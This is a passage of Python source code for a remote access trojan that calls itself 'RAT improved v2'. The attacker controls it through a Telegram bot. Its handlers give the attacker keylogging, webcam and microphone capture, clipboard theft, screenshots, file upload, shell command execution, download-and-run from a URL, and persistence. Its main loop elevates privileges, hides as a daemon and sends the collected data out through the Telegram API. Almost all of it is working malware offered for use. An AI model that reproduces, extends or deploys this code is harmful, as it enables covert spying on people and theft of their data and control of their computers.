    elif command == "/killproc" or command == "killproc":
        if not arg:
            tg_send_message("Usage: /killproc <PID>", reply_markup=main_menu_keyboard())
            return
        result = kill_process(arg.strip())
        tg_send_message(result, reply_markup=main_menu_keyboard())

    elif command == "/kill" or command == "kill":
        kill_self()
        # won't send

    elif command == "/hb" or command == "hb":
        # manual heartbeat
        try:
            tg_send_message(f"🟢 <b>MANUAL HEARTBEAT</b> - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", reply_markup=main_menu_keyboard())
        except:
            pass

    elif command == "/help" or command == "help":
        help_text = (
            "📋 <b>Available Commands (all can be used inline):</b>\n"
            "/screenshot, /info, /location\n"
            "/cmd <command>, /upload <path>, /download <URL> <path>, /run <URL> [args]\n"
            "/clipboard, /clipboard_set <text>\n"
            "/keylog_start, /keylog_stop, /keylog_dump, /keylog_status\n"
            "/webcam, /webcam_list, /mic, /wallpaper <path/url>\n"
            "/persist, /kill\n"
            "/ls [path], /ps, /killproc <PID>\n"
            "/lock, /shutdown, /reboot\n"
            "/popup <message>, /hb (manual heartbeat)\n"
            "Use inline menu buttons for quick access."
        )
        tg_send_message(help_text, reply_markup=main_menu_keyboard())

    else:
        tg_send_message(f"Unknown command: {command}\nType /help for list.", reply_markup=main_menu_keyboard())

# ---------- CALLBACK QUERY HANDLER ----------
def handle_callback(callback_data):
    if callback_data == "menu_main":
        tg_send_message("🏠 <b>Main Menu</b> - choose an action:", reply_markup=main_menu_keyboard())
    elif callback_data == "menu_screenshot":
        path = take_screenshot()
        if path:
            tg_send_photo(path, "📸 Screenshot", reply_markup=main_menu_keyboard())
            os.remove(path)
        else:
            tg_send_message("Screenshot failed.", reply_markup=main_menu_keyboard())
    elif callback_data == "menu_info":
        info = get_system_info()
        tg_send_message(info, reply_markup=main_menu_keyboard())
    elif callback_data == "menu_keylogger":
        tg_send_message("⌨️ <b>Keylogger Menu</b>", reply_markup=keylogger_menu())
    elif callback_data == "menu_clipboard":
        tg_send_message("📋 <b>Clipboard Menu</b>", reply_markup=clipboard_menu())
    elif callback_data == "menu_webcam":
        tg_send_message("📷 <b>Webcam Menu</b>", reply_markup=webcam_menu())
    elif callback_data == "menu_mic":
        path, err = record_audio(duration=10)
        if path:
            tg_send_audio(path, "🎤 Audio recording (10s)", reply_markup=main_menu_keyboard())
            os.remove(path)
        else:
            tg_send_message(f"Audio failed: {err}", reply_markup=main_menu_keyboard())
    elif callback_data == "menu_file":
        tg_send_message("📂 <b>File Manager Menu</b>", reply_markup=file_menu())
    elif callback_data == "menu_process":
        tg_send_message("⚙️ <b>Process Control Menu</b>", reply_markup=process_menu())
    elif callback_data == "menu_persist":
        result = add_persistence()
        tg_send_message(result, reply_markup=main_menu_keyboard())
    elif callback_data == "menu_run":
        tg_send_message("🚀 <b>Run/Download Menu</b>\nUse /run <URL> [args] manually.", reply_markup=run_menu())
    elif callback_data == "menu_power":
        tg_send_message("🛑 <b>Power Menu</b>", reply_markup=power_menu())
    elif callback_data == "menu_kill":
        tg_send_message("💀 <b>Self-Destruct</b> - are you sure? Use /kill to confirm.", reply_markup=main_menu_keyboard())
    elif callback_data == "menu_help":
        help_text = (
            "📋 <b>All Commands</b>\n"
            "/screenshot, /info, /location\n"
            "/cmd, /upload, /download, /run\n"
            "/clipboard, /clipboard_set\n"
            "/keylog_start, /keylog_stop, /keylog_dump, /keylog_status\n"
            "/webcam, /webcam_list, /mic, /wallpaper\n"
            "/persist, /kill\n"
            "/ls, /ps, /killproc\n"
            "/lock, /shutdown, /reboot\n"
            "/popup, /hb"
        )
        tg_send_message(help_text, reply_markup=main_menu_keyboard())
    elif callback_data == "keylog_start":
        result = start_keylogger()
        tg_send_message(result, reply_markup=keylogger_menu())
    elif callback_data == "keylog_stop":
        result = stop_keylogger(send_log=True)
        tg_send_message(result, reply_markup=keylogger_menu())
    elif callback_data == "keylog_dump":
        result = dump_keylog()
        tg_send_message(result, reply_markup=keylogger_menu())
    elif callback_data == "keylog_status":
        status = "Running" if keylog_running else "Stopped"
        count = len(keylog_data)
        tg_send_message(f"Keylogger status: {status}, keystrokes: {count}", reply_markup=keylogger_menu())
    elif callback_data == "clip_get":
        text = get_clipboard_text()
        if len(text) > 4000:
            text = text[:4000] + "\n...truncated"
        tg_send_message(f"<b>Clipboard:</b>\n<code>{text}</code>", reply_markup=clipboard_menu())
    elif callback_data == "clip_set":
        tg_send_message("Send /clipboard_set <text> to set clipboard.", reply_markup=clipboard_menu())
    elif callback_data == "webcam_cap":
        for idx in [0,1,2]:
            path, err = capture_webcam(idx)
            if path:
                tg_send_photo(path, f"📷 Webcam (index {idx})", reply_markup=main_menu_keyboard())
                os.remove(path)
                return
        tg_send_message(f"Webcam failed: {err if 'err' in locals() else 'all indices failed'}", reply_markup=main_menu_keyboard())
    elif callback_data == "webcam_list":
        devs = list_webcams()
        tg_send_message("Webcams:\n" + "\n".join(devs), reply_markup=main_menu_keyboard())
    elif callback_data == "power_lock":
        result = lock_workstation()
        tg_send_message(result, reply_markup=main_menu_keyboard())
    elif callback_data == "power_shutdown":
        result = shutdown_pc()
        tg_send_message(result, reply_markup=main_menu_keyboard())
    elif callback_data == "power_reboot":
        result = reboot_pc()
        tg_send_message(result, reply_markup=main_menu_keyboard())
    elif callback_data == "proc_list":
        result = list_processes()
        if len(result) > 4000:
            result = result[:4000] + "\n...truncated"
        tg_send_message(f"<b>Processes:</b>\n<code>{result}</code>", reply_markup=main_menu_keyboard())
    elif callback_data == "proc_kill":
        tg_send_message("Send /killproc <PID> to kill a process.", reply_markup=main_menu_keyboard())
    elif callback_data == "file_ls":
        result = list_directory(".")
        if len(result) > 4000:
            result = result[:4000] + "\n...truncated"
        tg_send_message(f"<b>Current directory:</b>\n<code>{result}</code>", reply_markup=main_menu_keyboard())
    elif callback_data == "file_upload":
        tg_send_message("Send /upload <path> to upload a file.", reply_markup=main_menu_keyboard())
    elif callback_data == "file_download":
        tg_send_message("Send /download <URL> <save_path> to download a file.", reply_markup=main_menu_keyboard())
    elif callback_data == "run_url":
        tg_send_message("Send /run <URL> [args] to download and execute.", reply_markup=main_menu_keyboard())
    else:
        tg_send_message("Unknown callback.", reply_markup=main_menu_keyboard())

# ---------- MISSING FUNCTIONS ----------
def show_popup(message):
    if IS_WINDOWS:
        try:
            import ctypes
            ctypes.windll.user32.MessageBoxW(0, message, "System Alert", 0x40 | 0x1)
            return "Popup displayed."
        except Exception as e:
            return f"Popup failed: {str(e)}"
    else:
        try:
            if IS_LINUX:
                subprocess.run(["notify-send", "System Alert", message], timeout=5)
            elif IS_MAC:
                subprocess.run(["osascript", "-e", f'display alert "System Alert" message "{message}"'], timeout=5)
            return "Popup displayed (native notification)."
        except:
            return "Popup not supported."

def shutdown_pc():
    try:
        if IS_WINDOWS:
            os.system("shutdown /s /t 0")
        else:
            os.system("shutdown -h now") if IS_LINUX else os.system("sudo shutdown -h now")
        return "Shutting down..."
    except Exception as e:
        return f"Failed: {str(e)}"

def reboot_pc():
    try:
        if IS_WINDOWS:
            os.system("shutdown /r /t 0")
        else:
            os.system("reboot") if IS_LINUX else os.system("sudo reboot")
        return "Rebooting..."
    except Exception as e:
        return f"Failed: {str(e)}"

def lock_workstation():
    if IS_WINDOWS:
        try:
            import ctypes
            ctypes.windll.user32.LockWorkStation()
            return "Workstation locked."
        except Exception as e:
            return f"Lock failed: {str(e)}"
    else:
        return "Lock not supported on this OS."

def list_directory(path="."):
    try:
        items = os.listdir(path)
        result = []
        for item in items:
            full = os.path.join(path, item)
            if os.path.isdir(full):
                result.append(f"[DIR] {item}")
            else:
                size = os.path.getsize(full)
                result.append(f"[FILE] {item} ({size} bytes)")
        return "\n".join(result) if result else "Empty directory."
    except Exception as e:
        return f"Error: {str(e)}"

def list_processes():
    if IS_WINDOWS:
        cmd = "tasklist"
    else:
        cmd = "ps -aux"
    return execute_cmd(cmd)

def kill_process(pid):
    try:
        if IS_WINDOWS:
            subprocess.run(["taskkill", "/PID", str(pid), "/F"], capture_output=True, timeout=10)
        else:
            os.kill(int(pid), 9)
        return f"Process {pid} killed."
    except Exception as e:
        return f"Failed: {str(e)}"

def get_location():
    if requests is None:
        return "Requests not available"
    try:
        resp = requests.get("https://ipinfo.io/json", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            return f"IP: {data.get('ip')}\nCity: {data.get('city')}\nRegion: {data.get('region')}\nCountry: {data.get('country')}\nLoc: {data.get('loc')}\nISP: {data.get('org')}"
        else:
            return "API error"
    except Exception as e:
        log_error(f"location: {e}")
        return f"Error: {str(e)}"

# ---------- MAIN ----------
def main():
    elevate()
    daemonize()
    log_error("RAT improved v2 started")
    if not os.path.exists(get_rat_path()):
        add_persistence()
    # Send online with menu
    tg_send_message(f"🟢 <b>RAT ONLINE (Improved v2)</b> - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nUse /help or inline menu.", reply_markup=main_menu_keyboard())
    # Heartbeat thread
    hb_thread = threading.Thread(target=heartbeat_loop, daemon=True)
    hb_thread.start()
    last_update_id = 0
    while True:
        try:
            updates = tg_get_updates(offset=last_update_id + 1)
            for upd in updates:
                if "callback_query" in upd:
                    query = upd["callback_query"]
                    data = query.get("data", "")
                    # answer callback query to remove loading state
                    try:
                        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery", data={"callback_query_id": query["id"]}, timeout=5)
                    except:
                        pass
                    last_update_id = upd["update_id"]
                    threading.Thread(target=handle_callback, args=(data,), daemon=True).start()
                elif "message" in upd and "text" in upd["message"]:
                    msg = upd["message"]
                    if str(msg["chat"]["id"]) != CHAT_ID:
                        continue
                    text = msg["text"]
                    last_update_id = upd["update_id"]
                    threading.Thread(target=process_command, args=(text,), daemon=True).start()
                else:
                    last_update_id = upd["update_id"]
        except Exception as e:
            log_error(f"main loop error: {e}")
        time.sleep(1)

if __name__ == "__main__":
    main()
